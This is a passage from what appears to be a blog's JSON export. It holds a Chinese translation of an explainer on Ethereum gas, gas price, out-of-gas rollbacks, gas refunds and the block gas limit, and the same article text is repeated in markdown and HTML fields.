EVM 处理该笔交易的描述：\n\n|   |操作消耗的燃气|剩余燃气|\n|------|------|-------|\n|交易开始||150|\n|存储 31|45|105|\n|两个数相加|10|95|\n|存储和|45|50|\n|交易结束|数字 31 和 加法的和-|-已经被存储写入区块链|\n\n交易发起人支付给矿工的费用是：\n\n**（150–50) × 0.02µETH = 2µETH = 0.000002 ETH**\n\n## 燃料与费用\n\n交易发起人提供足够的燃料与提供足够的费用是有区别的。以下是对交易的可能影响：\n\n||燃料|费用|\n|---|---|---|\n|太低|不会广播给矿工（错误：`intrinsic gas too low`）|矿工不会执行计算|\n|低|少量计算或者燃料耗尽|之后会打包进区块|\n|中等|通常是理想的|通常是理想的|\n|高|可能导致打包被延迟|尽快被打包入区块|\n|太高|不会广播给矿工（错误：`exceeds block gas limit`）|如果交易发起人没有足够的以太币，则不会广播给矿工|\n\n尽管提供了费用，但是一笔燃料很低的交易甚至可能不会到达矿工处。如果一笔交易提供了足够的燃料，但是费用很低，即使该交易到达矿工处，当矿工看到这个费用之后也不会对其进行计算处理。费用决定了交易将被打包进入区块的顺序。而提供高燃料会导致交易打包时间更长的原因在本文中 *高初始燃气可能会导致延迟* 部分。\n\n## 初始燃气\n\n让我们讨论一下交易开始时的燃料需求。抽象地说，在被允许使用世界计算机的计算和存储之前，世界计算机需要知道交易发起人是否有能力支付费用。具体地说，在处理交易之前，矿工需要知道自己是否可以获得报酬。一笔交易需要指定它愿意花费的最大燃料值。对于本文的目的来说，这个需求被称作初始燃气。初始燃气是交易的重要部分。不幸的是，不同的文档使用了不同的词来描述这个关键部分：\n* [以太坊白皮书](https://github.com/ethereum/wiki/wiki/White-Paper)中使用了 初始燃气\n* [以太坊黄皮书](https://github.com/ethereum/yellowpaper)中使用了燃料限制\n* [Geth](https://github.com/ethereum/go-ethereum/releases) 和 [web3.js](https://github.com/ethereum/web3.js/releases) 等软件中，简单地使用了 “燃气”。\n\n因为在通常情况下，不真正运行计算（关联 [停机问题](https://en.wikipedia.org/wiki/Halting_problem)），矿工是不知道到底需要多少计算量的，所以初始燃气使事情变得更加简单（而不用 “燃气作为支付的消耗方式”（away from say a pay as gas is consumed approach） 这种说法）。作为一个以太坊应用的用户，必须提供初始燃气似乎很复杂，但开发人员可以使用一些工具来估计初始燃气并隐藏用户的详细信息。\n\n## 燃料耗尽异常\n\n一笔交易提供了它愿意消耗的最大燃料值。该燃气会被 EVM 中的每个操作消耗。如果燃料消耗完毕，而交易还未完成，那么一个燃料耗尽的异常就会发生。交易发起人为已经执行的操作支付，而交易也被打包进区块，但是所有的状态改变（比如合约的创建，值的存储，和[日志](https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e)的写入）都会回滚。\n\n让我们还是使用第一个例子作为场景，但是这次交易发起人指定初始燃气为 90（而不是 150）。这里是执行的示意图：\n\n||操作的燃料消耗|剩余燃料|\n|-----|-----|-----|\n|交易开始||90|\n|存储 31|45|45|\n|求和|10|35|\n|保存和|45|燃料耗尽|\n|交易结束|因为燃料耗尽，存储的 31 会回滚|耗尽|\n\n在交易开始时，交易发起人需要拿出所有燃料的资金： 初始燃气 * 燃气价格 = 存放在柜台的以太币。柜台中的以太币数量为：\n\n**90 × 0.02µETH = 1.8µETH**\n\n当每个操作执行时，燃气会消耗，而在存储和时产生了燃料耗尽异常。这会导致所有的操作撤销，代表数字 31 会被回滚到它之前存储的值，但是交易依旧被打包进入区块链，而且矿工获得所有的酬金：1.8μ ETH。\n\n## 燃气回退\n\nEVM 中有两个负值燃气的操作：\n* 清空合约是 -24000\n* 清空存储是 -15000\n\n当 EVM 执行了这样的一个操作，它将被记录在单独的退款计数器中。燃气退款仅在交易结束时提供。 此外，最高返还金额等于一半已经消耗的燃气。\n\n一个关键点在于，一笔交易的燃料永远不会增加。当 EVM 执行操作时，燃料总是减少（当一些合约或者存储被清空，退款计数器会增加）。如果燃料到零或者负数，那么立马会产生一个燃料耗尽异常：退款计数器中有多少燃气并不重要。一笔交易为了能够使用燃气退款，它必须避免燃料耗尽异常。假设一笔交易有足够的燃气，然后它就能使用退款计数器中的燃气。\n\n退款的燃气值最多为消耗的燃气值的一半。例如，如果一笔交易使用了 60000 燃气，然后清空了 2 个合约而获得 48000 的一笔退款（每笔 24000），交易发起人还是需要支付给矿工 30000 燃气。这激励了矿工使用负值燃气操作处理交易，因为这给了他们收入，并确保了矿工不可能为他人的计算付款。\n\n## 区块燃气限制（Block gas limit:BGL）\n\n回顾一下，初始燃气由用户指定，是一笔交易将要消耗的燃料最大值。那么一个区块中能够容纳多少交易呢？答案是直到所有交易的初始燃气总和达到区块燃气限制（BGL）为止。当前(2016/6/23)的 BGL 是 4,712,388 （1.5π 的数字形式），表示能够在一个区块（平均出块时间 15 秒）中容纳 224 笔初始燃气为 21000 的交易。为了防止像比特币一样对区块是否变大产生分歧，以太坊协议允许矿工对自己的区块往任意方向进行 1/1024(0.0976%) 幅度的 BGL 调整。与协议不同的是默认的采矿策略，其最小 BGL 为 4,712,388。\n\n## 高初始燃气可能存在的延迟\n\n既然燃料耗尽异常对交易发起人来说几乎是在浪费金钱，那么将初始燃气设置得更高总是更好的。所以，交易发起人为什么不总是将初始燃气指定为 4,000,000 呢？\n\n答案在于交易的初始燃气和它实际消耗的燃气之间的差异。矿工只会获得一笔交易实际消耗的燃气；所有未使用的燃气会被回退给交易发起人。\n\n如果同时存在一笔初始燃气为 4M 的交易和 100 笔初始燃气为 40,000 的交易，矿工可能会选择后者，因为这 100 笔交易的收入有更高的预测性。如果一笔初始燃气为 4M 的交易实际只消耗了 1M 燃气，那么矿工将损失 3M 的潜在燃气收入。所以，矿工更愿意优先考虑一些“小”交易，而不是拥有高初始燃气（除非[内在气体](https://github.com/ethereum/pyethereum/blob/3841e9a406f4ca9452afa45035fb07b5ce6314d9/ethereum/transactions.py#L177)也十分高）的一笔交易。这会导致高初始燃气的交易在被打包之前存在延迟，并且也解释了过高的初始燃气可能会是有害的。\n\n## 绕过交易所\n\n以太坊有两种类型的账户：\n* 用户账户（由私钥控制）\n* 合约（由代码控制）\n\n发送以太币到一个用户账户需要 21000 的燃气费用，而发送以太币到合约则需要更高的费用，这个费用取决于合约代码和交易中发送的数据。一些交易所会对他们所有的交易都只提供 21000 燃气，这表示在用户想要从交易所发送以太币到他们 Mist（以太坊钱包） 中的合约钱包时，交易会耗尽燃料，以太币永远也不会发送到用户的合约钱包。\n\n## 计量和费用\n\n关于计量和费用之间的区别还有一点需要注意。在比特币中，计量是根据字节来的：交易中的字节数。在以太坊中，计算也需要计量，因为少量的代码也可能被编码成永远执行。计量计算量也是使用燃气的一个原因。但是拥有燃气不代表需要费用。\n\n比如，在一个私链上，每个账户每天可以拥有 X 燃气，或者是每笔交易 Y 燃气，或者其他方案。另一方面，有费用不代表需要燃气：费用可以基于不同的计量，如字节。对于公有链上的安全性来说，燃气和费用两者都需要，而替代方案可能更适合私有链（比如，对于任何人都可以创建账户的公有链来说，每个账户每天有 X 燃气，可以被“女巫攻击”（Sybil-attacked））。\n\n## 结论\n\n燃气是使用世界计算机的计量方式和燃料，与使用世界计算机所支付的以太币费用是不同的。提供足够的燃料和足够的费用，两者之间是有区别的。运行时燃料耗尽会花费钱，而提供更多的燃气会使得更加安全，反正所有的未使用的燃气都会被回退。燃气是以太坊的核心部分，它的大多数话题已经被讨论过。这里有更多关于它的信息，包括[估计燃气](https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethestimategas)，内在燃气（intrinsic gas），[燃气价格预告（gas price oracle）](https://github.com/ethereum/go-ethereum/wiki/Gas-Price-Oracle)，[交易大小的影响](https://ethereum.stackexchange.com/questions/1106/is-there-a-limit-for-transaction-size)，读者可以在本文的基础上进一步地探索和理解。\n","slug":"以太坊，燃气，燃料-和-费用","published":1,"updated":"2018-03-09T09:32:59.585Z","layout":"post","photos":[],"link":"","_id":"cjf7piavk000vpkwo7l7huqtj","content":"<p><a href=\"https://media.consensys.net/ethereum-gas-fuel-and-fees-3333e17fe1dc\" target=\"_blank\" rel=\"noopener\">来自 BTC Relay 的首席开发人员 Joseph Chow ：Ethereum,Gas,Fuel &amp; Fees</a></p>\n<p>以太坊是分布式和诚实的应用程序的平台，可在没有任何管理员或单点故障的全球点对点网络上运行。这些应用程序没有停机时间，任何人都可以创建它们：这是无许可的创新。这些应用是诚实的，不可改变的，并且在编码时总是互操作。从这个角度来说，智能合约的术语是合理的，因为它们是始终遵循其创建时所设定的条款的最终合约。</p>\n<p>使这成为可能的核心实际上是世界计算机。在技术上称为以太坊虚拟机（EVM），它包括用于计算和数据存储的操作。交易代表世界计算机内的单个会话，它是交互的单位，类似于句子如何作为语法意义的单位，尽管单个句子可以包含很多单词。</p>\n<h2 id=\"燃气（gas）是什么？\"><a href=\"#燃气（gas）是什么？\" class=\"headerlink\" title=\"燃气（gas）是什么？\"></a>燃气（gas）是什么？</h2><p>燃气是世界计算机使用的计量单位。做一个类比，电量按千瓦小时计量，而在以太坊中使用更多的算力和存储代表着会使用更多的燃气。计量的一个基本原因是它可以激励人们（矿工）操作世界计算机。这些矿工对交易的处理会收取费用，费用则取决于计量方案：燃气。</p>\n<p>EVM 中的每个操作都会消耗燃气。例如，一个乘法（<code>MUL</code>）消耗 5 燃气而一个加法（<code>ADD</code>）消耗 3 燃气。<a href=\"https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit\" target=\"_blank\" rel=\"noopener\">以太坊操作的燃气消耗表格</a></p>\n<p><strong>将燃气看做是燃料的代名词</strong></p>\n<p>计量与费用不同，而燃气和以太币也不同。为了帮助说清楚这个，将燃气看做是燃料的代名词。一笔交易必须提供足够的燃料，或者初始燃气，来支持 EVM 的计算和存储的使用。所有的剩余燃气会回退给交易的发起人：初始化该笔交易的用户。一笔燃料耗尽的交易会回滚，但是依旧包含在区块中，并且相关的费用依旧支付给矿工。</p>\n<p>了解了燃料角度的概述，让我们来看看费用相关的概述。在 EVM 中，每个操作都会消耗已经预定义数量的燃气（比如，一个乘法操作总是消耗 5 燃气），用户在每笔交易中都可以指定燃气价格。当前的燃气价格是 0.02μ 以太币，或者 0.00000002 ETH。交易发起人支付给矿工的费用是交易的 <code>(开始燃气 - 剩余燃气) * 燃气价格</code>。</p>\n<p>这里是一个关于交易燃料和交易费用的影响的总结：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>燃料</th>\n<th>费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>通常</td>\n<td>EVM 中的每个操作都会消耗一定数量预先已经设定好的燃料；用户不能更改它。每笔交易都有一个用户指定的初始燃气。</td>\n<td>每笔交易都有用户指定的燃料价格（当前默认为每单位燃气 0.02μ ETH）</td>\n</tr>\n<tr>\n<td>交易开始时</td>\n<td>交易发起人应该提供足够的燃料：初始燃气。剩余燃气 = 初始燃气。</td>\n<td>交易发起人必须支付所有燃料。放置 <code>初始燃气 * 燃气价格 = 以太币</code> 在托管中。</td>\n</tr>\n<tr>\n<td>每个操作</td>\n<td>剩余燃气会由于操作消耗而减少</td>\n<td>知道交易完成（不论成功不成功），才会有后续的操作。</td>\n</tr>\n<tr>\n<td>不成功的交易</td>\n<td>剩余燃气为零，还有未完成的操作。这导致一个燃气耗尽的异常，而所有的操作都会被撤销</td>\n<td>所有托管的费用都会被支付给矿工</td>\n</tr>\n<tr>\n<td>成功的交易</td>\n<td>所有剩余的燃气会回退给交易发起人</td>\n<td><code>（初始燃气 - 剩余燃气） * 燃气价格 = 费用</code> 支付给矿工；<code>剩余燃气 * 燃气价格</code> = 回退给交易发起人的费用。</td>\n</tr>\n</tbody>\n</table>\n<p>在交易开始时，被要求用来作为初始燃气的以太币会被搁置，然后剩余燃气值会被设置为初始燃气值。随着交易中的每个操作，燃气会被消耗，剩余燃气逐渐变少。如果发生燃气耗尽的异常，所有的操作都会回滚，而之前搁置的所有的以太币都会被支付给矿工。如果交易成功执行完毕，所有的剩余部分的燃气会回退给交易发起人，而已经消耗的燃气则支付给矿工。</p>\n<h2 id=\"简单的例子\"><a href=\"#简单的例子\" class=\"headerlink\" title=\"简单的例子\"></a>简单的例子</h2><p>在下面的情景模拟中，假设存储消耗 45 燃气，一个加法操作消耗 10 燃气。这个场景涉及到在 EVM 中存储数字 31，将两个数相加，然后存储它们的和。让我们假设交易发起人指定了 150 的初始燃气，和 0.02μ 以太币的燃气价格。下面是 EVM 处理该笔交易的描述：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>操作消耗的燃气</th>\n<th>剩余燃气</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>交易开始</td>\n<td></td>\n<td>150</td>\n</tr>\n<tr>\n<td>存储 31</td>\n<td>45</td>\n<td>105</td>\n</tr>\n<tr>\n<td>两个数相加</td>\n<td>10</td>\n<td>95</td>\n</tr>\n<tr>\n<td>存储和</td>\n<td>45</td>\n<td>50</td>\n</tr>\n<tr>\n<td>交易结束</td>\n<td>数字 31 和 加法的和-</td>\n<td>-已经被存储写入区块链</td>\n</tr>\n</tbody>\n</table>\n<p>交易发起人支付给矿工的费用是：</p>\n<p><strong>（150–50) × 0.02µETH = 2µETH = 0.000002 ETH</strong></p>\n<h2 id=\"燃料与费用\"><a href=\"#燃料与费用\" class=\"headerlink\" title=\"燃料与费用\"></a>燃料与费用</h2><p>交易发起人提供足够的燃料与提供足够的费用是有区别的。以下是对交易的可能影响：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>燃料</th>\n<th>费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>太低</td>\n<td>不会广播给矿工（错误：<code>intrinsic gas too low</code>）</td>\n<td>矿工不会执行计算</td>\n</tr>\n<tr>\n<td>低</td>\n<td>少量计算或者燃料耗尽</td>\n<td>之后会打包进区块</td>\n</tr>\n<tr>\n<td>中等</td>\n<td>通常是理想的</td>\n<td>通常是理想的</td>\n</tr>\n<tr>\n<td>高</td>\n<td>可能导致打包被延迟</td>\n<td>尽快被打包入区块</td>\n</tr>\n<tr>\n<td>太高</td>\n<td>不会广播给矿工（错误：<code>exceeds block gas limit</code>）</td>\n<td>如果交易发起人没有足够的以太币，则不会广播给矿工</td>\n</tr>\n</tbody>\n</table>\n<p>尽管提供了费用，但是一笔燃料很低的交易甚至可能不会到达矿工处。如果一笔交易提供了足够的燃料，但是费用很低，即使该交易到达矿工处，当矿工看到这个费用之后也不会对其进行计算处理。费用决定了交易将被打包进入区块的顺序。而提供高燃料会导致交易打包时间更长的原因在本文中 <em>高初始燃气可能会导致延迟</em> 部分。</p>\n<h2 id=\"初始燃气\"><a href=\"#初始燃气\" class=\"headerlink\" title=\"初始燃气\"></a>初始燃气</h2><p>让我们讨论一下交易开始时的燃料需求。抽象地说，在被允许使用世界计算机的计算和存储之前，世界计算机需要知道交易发起人是否有能力支付费用。具体地说，在处理交易之前，矿工需要知道自己是否可以获得报酬。一笔交易需要指定它愿意花费的最大燃料值。对于本文的目的来说，这个需求被称作初始燃气。初始燃气是交易的重要部分。不幸的是，不同的文档使用了不同的词来描述这个关键部分：</p>\n<ul>\n<li><a href=\"https://github.com/ethereum/wiki/wiki/White-Paper\" target=\"_blank\" rel=\"noopener\">以太坊白皮书</a>中使用了 初始燃气</li>\n<li><a href=\"https://github.com/ethereum/yellowpaper\" target=\"_blank\" rel=\"noopener\">以太坊黄皮书</a>中使用了燃料限制</li>\n<li><a href=\"https://github.com/ethereum/go-ethereum/releases\" target=\"_blank\" rel=\"noopener\">Geth</a> 和 <a href=\"https://github.com/ethereum/web3.js/releases\" target=\"_blank\" rel=\"noopener\">web3.js</a> 等软件中，简单地使用了 “燃气”。</li>\n</ul>\n<p>因为在通常情况下，不真正运行计算（关联 <a href=\"https://en.wikipedia.org/wiki/Halting_problem\" target=\"_blank\" rel=\"noopener\">停机问题</a>），矿工是不知道到底需要多少计算量的，所以初始燃气使事情变得更加简单（而不用 “燃气作为支付的消耗方式”（away from say a pay as gas is consumed approach） 这种说法）。作为一个以太坊应用的用户，必须提供初始燃气似乎很复杂，但开发人员可以使用一些工具来估计初始燃气并隐藏用户的详细信息。</p>\n<h2 id=\"燃料耗尽异常\"><a href=\"#燃料耗尽异常\" class=\"headerlink\" title=\"燃料耗尽异常\"></a>燃料耗尽异常</h2><p>一笔交易提供了它愿意消耗的最大燃料值。该燃气会被 EVM 中的每个操作消耗。如果燃料消耗完毕，而交易还未完成，那么一个燃料耗尽的异常就会发生。交易发起人为已经执行的操作支付，而交易也被打包进区块，但是所有的状态改变（比如合约的创建，值的存储，和<a href=\"https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e\" target=\"_blank\" rel=\"noopener\">日志</a>的写入）都会回滚。</p>\n<p>让我们还是使用第一个例子作为场景，但是这次交易发起人指定初始燃气为 90（而不是 150）。这里是执行的示意图：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>操作的燃料消耗</th>\n<th>剩余燃料</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>交易开始</td>\n<td></td>\n<td>90</td>\n</tr>\n<tr>\n<td>存储 31</td>\n<td>45</td>\n<td>45</td>\n</tr>\n<tr>\n<td>求和</td>\n<td>10</td>\n<td>35</td>\n</tr>\n<tr>\n<td>保存和</td>\n<td>45</td>\n<td>燃料耗尽</td>\n</tr>\n<tr>\n<td>交易结束</td>\n<td>因为燃料耗尽，存储的 31 会回滚</td>\n<td>耗尽</td>\n</tr>\n</tbody>\n</table>\n<p>在交易开始时，交易发起人需要拿出所有燃料的资金： 初始燃气 * 燃气价格 = 存放在柜台的以太币。柜台中的以太币数量为：</p>\n<p><strong>90 × 0.02µETH = 1.8µETH</strong></p>\n<p>当每个操作执行时，燃气会消耗，而在存储和时产生了燃料耗尽异常。这会导致所有的操作撤销，代表数字 31 会被回滚到它之前存储的值，但是交易依旧被打包进入区块链，而且矿工获得所有的酬金：1.8μ ETH。</p>\n<h2 id=\"燃气回退\"><a href=\"#燃气回退\" class=\"headerlink\" title=\"燃气回退\"></a>燃气回退</h2><p>EVM 中有两个负值燃气的操作：</p>\n<ul>\n<li>清空合约是 -24000</li>\n<li>清空存储是 -15000</li>\n</ul>\n<p>当 EVM 执行了这样的一个操作，它将被记录在单独的退款计数器中。燃气退款仅在交易结束时提供。 此外，最高返还金额等于一半已经消耗的燃气。</p>\n<p>一个关键点在于，一笔交易的燃料永远不会增加。当 EVM 执行操作时，燃料总是减少（当一些合约或者存储被清空，退款计数器会增加）。如果燃料到零或者负数，那么立马会产生一个燃料耗尽异常：退款计数器中有多少燃气并不重要。一笔交易为了能够使用燃气退款，它必须避免燃料耗尽异常。假设一笔交易有足够的燃气，然后它就能使用退款计数器中的燃气。</p>\n<p>退款的燃气值最多为消耗的燃气值的一半。例如，如果一笔交易使用了 60000 燃气，然后清空了 2 个合约而获得 48000 的一笔退款（每笔 24000），交易发起人还是需要支付给矿工 30000 燃气。这激励了矿工使用负值燃气操作处理交易，因为这给了他们收入，并确保了矿工不可能为他人的计算付款。</p>\n<h2 id=\"区块燃气限制（Block-gas-limit-BGL）\"><a href=\"#区块燃气限制（Block-gas-limit-BGL）\" class=\"headerlink\" title=\"区块燃气限制（Block gas limit:BGL）\"></a>区块燃气限制（Block gas limit:BGL）</h2><p>回顾一下，初始燃气由用户指定，是一笔交易将要消耗的燃料最大值。那么一个区块中能够容纳多少交易呢？答案是直到所有交易的初始燃气总和达到区块燃气限制（BGL）为止。当前(2016/6/23)的 BGL 是 4,712,388 （1.5π 的数字形式），表示能够在一个区块（平均出块时间 15 秒）中容纳 224 笔初始燃气为 21000 的交易。为了防止像比特币一样对区块是否变大产生分歧，以太坊协议允许矿工对自己的区块往任意方向进行 1/1024(0.0976%) 幅度的 BGL 调整。与协议不同的是默认的采矿策略，其最小 BGL 为 4,712,388。</p>\n<h2 id=\"高初始燃气可能存在的延迟\"><a href=\"#高初始燃气可能存在的延迟\" class=\"headerlink\" title=\"高初始燃气可能存在的延迟\"></a>高初始燃气可能存在的延迟</h2><p>既然燃料耗尽异常对交易发起人来说几乎是在浪费金钱，那么将初始燃气设置得更高总是更好的。所以，交易发起人为什么不总是将初始燃气指定为 4,000,000 呢？</p>\n<p>答案在于交易的初始燃气和它实际消耗的燃气之间的差异。矿工只会获得一笔交易实际消耗的燃气；所有未使用的燃气会被回退给交易发起人。</p>\n<p>如果同时存在一笔初始燃气为 4M 的交易和 100 笔初始燃气为 40,000 的交易，矿工可能会选择后者，因为这 100 笔交易的收入有更高的预测性。如果一笔初始燃气为 4M 的交易实际只消耗了 1M 燃气，那么矿工将损失 3M 的潜在燃气收入。所以，矿工更愿意优先考虑一些“小”交易，而不是拥有高初始燃气（除非<a href=\"https://github.com/ethereum/pyethereum/blob/3841e9a406f4ca9452afa45035fb07b5ce6314d9/ethereum/transactions.py#L177\" target=\"_blank\" rel=\"noopener\">内在气体</a>也十分高）的一笔交易。这会导致高初始燃气的交易在被打包之前存在延迟，并且也解释了过高的初始燃气可能会是有害的。</p>\n<h2 id=\"绕过交易所\"><a href=\"#绕过交易所\" class=\"headerlink\" title=\"绕过交易所\"></a>绕过交易所</h2><p>以太坊有两种类型的账户：</p>\n<ul>\n<li>用户账户（由私钥控制）</li>\n<li>合约（由代码控制）</li>\n</ul>\n<p>发送以太币到一个用户账户需要 21000 的燃气费用，而发送以太币到合约则需要更高的费用，这个费用取决于合约代码和交易中发送的数据。一些交易所会对他们所有的交易都只提供 21000 燃气，这表示在用户想要从交易所发送以太币到他们 Mist（以太坊钱包） 中的合约钱包时，交易会耗尽燃料，以太币永远也不会发送到用户的合约钱包。</p>\n<h2 id=\"计量和费用\"><a href=\"#计量和费用\" class=\"headerlink\" title=\"计量和费用\"></a>计量和费用</h2><p>关于计量和费用之间的区别还有一点需要注意。在比特币中，计量是根据字节来的：交易中的字节数。在以太坊中，计算也需要计量，因为少量的代码也可能被编码成永远执行。计量计算量也是使用燃气的一个原因。但是拥有燃气不代表需要费用。</p>\n<p>比如，在一个私链上，每个账户每天可以拥有 X 燃气，或者是每笔交易 Y 燃气，或者其他方案。另一方面，有费用不代表需要燃气：费用可以基于不同的计量，如字节。对于公有链上的安全性来说，燃气和费用两者都需要，而替代方案可能更适合私有链（比如，对于任何人都可以创建账户的公有链来说，每个账户每天有 X 燃气，可以被“女巫攻击”（Sybil-attacked））。</p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>燃气是使用世界计算机的计量方式和燃料，与使用世界计算机所支付的以太币费用是不同的。提供足够的燃料和足够的费用，两者之间是有区别的。运行时燃料耗尽会花费钱，而提供更多的燃气会使得更加安全，反正所有的未使用的燃气都会被回退。燃气是以太坊的核心部分，它的大多数话题已经被讨论过。这里有更多关于它的信息，包括<a href=\"https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethestimategas\" target=\"_blank\" rel=\"noopener\">估计燃气</a>，内在燃气（intrinsic gas），<a href=\"https://github.com/ethereum/go-ethereum/wiki/Gas-Price-Oracle\" target=\"_blank\" rel=\"noopener\">燃气价格预告（gas price oracle）</a>，<a href=\"https://ethereum.stackexchange.com/questions/1106/is-there-a-limit-for-transaction-size\" target=\"_blank\" rel=\"noopener\">交易大小的影响</a>，读者可以在本文的基础上进一步地探索和理解。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://media.consensys.net/ethereum-gas-fuel-and-fees-3333e17fe1dc\" target=\"_blank\" rel=\"noopener\">来自 BTC Relay 的首席开发人员 Joseph Chow ：Ethereum,Gas,Fuel &amp; Fees</a></p>\n<p>以太坊是分布式和诚实的应用程序的平台，可在没有任何管理员或单点故障的全球点对点网络上运行。这些应用程序没有停机时间，任何人都可以创建它们：这是无许可的创新。这些应用是诚实的，不可改变的，并且在编码时总是互操作。从这个角度来说，智能合约的术语是合理的，因为它们是始终遵循其创建时所设定的条款的最终合约。</p>\n<p>使这成为可能的核心实际上是世界计算机。在技术上称为以太坊虚拟机（EVM），它包括用于计算和数据存储的操作。交易代表世界计算机内的单个会话，它是交互的单位，类似于句子如何作为语法意义的单位，尽管单个句子可以包含很多单词。</p>\n<h2 id=\"燃气（gas）是什么？\"><a href=\"#燃气（gas）是什么？\" class=\"headerlink\" title=\"燃气（gas）是什么？\"></a>燃气（gas）是什么？</h2><p>燃气是世界计算机使用的计量单位。做一个类比，电量按千瓦小时计量，而在以太坊中使用更多的算力和存储代表着会使用更多的燃气。计量的一个基本原因是它可以激励人们（矿工）操作世界计算机。这些矿工对交易的处理会收取费用，费用则取决于计量方案：燃气。</p>\n<p>EVM 中的每个操作都会消耗燃气。例如，一个乘法（<code>MUL</code>）消耗 5 燃气而一个加法（<code>ADD</code>）消耗 3 燃气。<a href=\"https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit\" target=\"_blank\" rel=\"noopener\">以太坊操作的燃气消耗表格</a></p>\n<p><strong>将燃气看做是燃料的代名词</strong></p>\n<p>计量与费用不同，而燃气和以太币也不同。为了帮助说清楚这个，将燃气看做是燃料的代名词。一笔交易必须提供足够的燃料，或者初始燃气，来支持 EVM 的计算和存储的使用。所有的剩余燃气会回退给交易的发起人：初始化该笔交易的用户。一笔燃料耗尽的交易会回滚，但是依旧包含在区块中，并且相关的费用依旧支付给矿工。</p>\n<p>了解了燃料角度的概述，让我们来看看费用相关的概述。在 EVM 中，每个操作都会消耗已经预定义数量的燃气（比如，一个乘法操作总是消耗 5 燃气），用户在每笔交易中都可以指定燃气价格。当前的燃气价格是 0.02μ 以太币，或者 0.00000002 ETH。交易发起人支付给矿工的费用是交易的 <code>(开始燃气 - 剩余燃气) * 燃气价格</code>。</p>\n<p>这里是一个关于交易燃料和交易费用的影响的总结：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>燃料</th>\n<th>费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>通常</td>\n<td>EVM 中的每个操作都会消耗一定数量预先已经设定好的燃料；用户不能更改它。每笔交易都有一个用户指定的初始燃气。</td>\n<td>每笔交易都有用户指定的燃料价格（当前默认为每单位燃气 0.02μ ETH）</td>\n</tr>\n<tr>\n<td>交易开始时</td>\n<td>交易发起人应该提供足够的燃料：初始燃气。剩余燃气 = 初始燃气。</td>\n<td>交易发起人必须支付所有燃料。放置 <code>初始燃气 * 燃气价格 = 以太币</code> 在托管中。</td>\n</tr>\n<tr>\n<td>每个操作</td>\n<td>剩余燃气会由于操作消耗而减少</td>\n<td>知道交易完成（不论成功不成功），才会有后续的操作。</td>\n</tr>\n<tr>\n<td>不成功的交易</td>\n<td>剩余燃气为零，还有未完成的操作。这导致一个燃气耗尽的异常，而所有的操作都会被撤销</td>\n<td>所有托管的费用都会被支付给矿工</td>\n</tr>\n<tr>\n<td>成功的交易</td>\n<td>所有剩余的燃气会回退给交易发起人</td>\n<td><code>（初始燃气 - 剩余燃气） * 燃气价格 = 费用</code> 支付给矿工；<code>剩余燃气 * 燃气价格</code> = 回退给交易发起人的费用。</td>\n</tr>\n</tbody>\n</table>\n<p>在交易开始时，被要求用来作为初始燃气的以太币会被搁置，然后剩余燃气值会被设置为初始燃气值。随着交易中的每个操作，燃气会被消耗，剩余燃气逐渐变少。如果发生燃气耗尽的异常，所有的操作都会回滚，而之前搁置的所有的以太币都会被支付给矿工。如果交易成功执行完毕，所有的剩余部分的燃气会回退给交易发起人，而已经消耗的燃气则支付给矿工。</p>\n<h2 id=\"简单的例子\"><a href=\"#简单的例子\" class=\"headerlink\" title=\"简单的例子\"></a>简单的例子</h2><p>在下面的情景模拟中，假设存储消耗 45 燃气，一个加法操作消耗 10 燃气。这个场景涉及到在 EVM 中存储数字 31，将两个数相加，然后存储它们的和。让我们假设交易发起人指定了 150 的初始燃气，和 0.02μ 以太币的燃气价格。下面是 EVM 处理该笔交易的描述：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>操作消耗的燃气</th>\n<th>剩余燃气</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>交易开始</td>\n<td></td>\n<td>150</td>\n</tr>\n<tr>\n<td>存储 31</td>\n<td>45</td>\n<td>105</td>\n</tr>\n<tr>\n<td>两个数相加</td>\n<td>10</td>\n<td>95</td>\n</tr>\n<tr>\n<td>存储和</td>\n<td>45</td>\n<td>50</td>\n</tr>\n<tr>\n<td>交易结束</td>\n<td>数字 31 和 加法的和-</td>\n<td>-已经被存储写入区块链</td>\n</tr>\n</tbody>\n</table>\n<p>交易发起人支付给矿工的费用是：</p>\n<p><strong>（150–50) × 0.02µETH = 2µETH = 0.000002 ETH</strong></p>\n<h2 id=\"燃料与费用\"><a href=\"#燃料与费用\" class=\"headerlink\" title=\"燃料与费用\"></a>燃料与费用</h2><p>交易发起人提供足够的燃料与提供足够的费用是有区别的。以下是对交易的可能影响：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>燃料</th>\n<th>费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>太低</td>\n<td>不会广播给矿工（错误：<code>intrinsic gas too low</code>）</td>\n<td>矿工不会执行计算</td>\n</tr>\n<tr>\n<td>低</td>\n<td>少量计算或者燃料耗尽</td>\n<td>之后会打包进区块</td>\n</tr>\n<tr>\n<td>中等</td>\n<td>通常是理想的</td>\n<td>通常是理想的</td>\n</tr>\n<tr>\n<td>高</td>\n<td>可能导致打包被延迟</td>\n<td>尽快被打包入区块</td>\n</tr>\n<tr>\n<td>太高</td>\n<td>不会广播给矿工（错误：<code>exceeds block gas 